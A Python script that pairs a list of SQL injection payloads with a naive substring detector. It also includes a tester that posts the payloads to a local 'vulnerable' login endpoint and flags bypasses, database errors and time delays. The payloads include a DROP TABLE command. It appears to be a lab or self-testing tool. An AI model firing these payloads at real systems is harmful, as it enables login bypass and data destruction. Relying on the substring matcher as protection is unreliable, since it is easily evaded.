# detector.py
import requests
from datetime import datetime

payloads = [
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "'; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1, 'test', 'test'--",
    "' OR SLEEP(5)--",   # Blind SQLi (time-based)
    "' AND 1=CONVERT(int, 'text')--",
    "' OR '' = '",
]

ERROR_PATTERNS = [
    "SQL syntax",
    "mysql_fetch",
    "ORA-01756",
    "SQLite",
    "MySQL server version",
    "syntax error",
]

TARGET = "http://127.0.0.1:5000/login"   # vulnerable endpoint
TIMEOUT = 8                              # max wait for requests


def detect_sqli(input_string: str) -> bool:
    """For Flask app: detect payloads and log attempts."""
    for payload in payloads:
        if payload.lower() in input_string.lower():
            with open("sqli_logs.txt", "a") as log:
                log.write(f"[{datetime.now()}] Detected SQLi attempt: {input_string}\n")
            return True
    return False


def run_tester():
    """Standalone: inject payloads, detect behavior, log results."""
    print("🚀 Starting SQLi tests on", TARGET)

    for p in payloads:
        data = {"username": p, "password": "x"}
        try:
            r = requests.post(TARGET, data=data, timeout=TIMEOUT)

            result = "[-] No effect"
            if "Welcome" in r.text:
                result = f"[+] Login bypass with payload: {p}"
            elif any(err.lower() in r.text.lower() for err in ERROR_PATTERNS):
                result = f"[!] SQL error message detected with payload: {p}"
            elif r.elapsed.total_seconds() > 4:   # detect delay
                result = f"[⏳] Time-based delay detected (blind SQLi?) with payload: {p}"

            print(result)

            # --- Log result ---
            with open("sqli_test_results.txt", "a", encoding="utf-8") as log:
                log.write(
                    f"[{datetime.now()}] Payload: {p}\n"
                    f"Status: {r.status_code}\n"
                    f"Elapsed: {r.elapsed.total_seconds()}s\n"
                    f"Result: {result}\n\n"
                )

        except requests.exceptions.Timeout:
            msg = f"[⏳] Request timed out with payload: {p}"
            print(msg)
            with open("sqli_test_results.txt", "a") as log:
                log.write(f"[{datetime.now()}] {msg}\n")

        except Exception as e:
            msg = f"[!] Request failed with payload {p}: {e}"
            print(msg)
            with open("sqli_test_results.txt", "a") as log:
                log.write(f"[{datetime.now()}] {msg}\n")

    print("✅ Testing completed. Results saved in sqli_test_results.txt")


if __name__ == "__main__":
    run_tester()
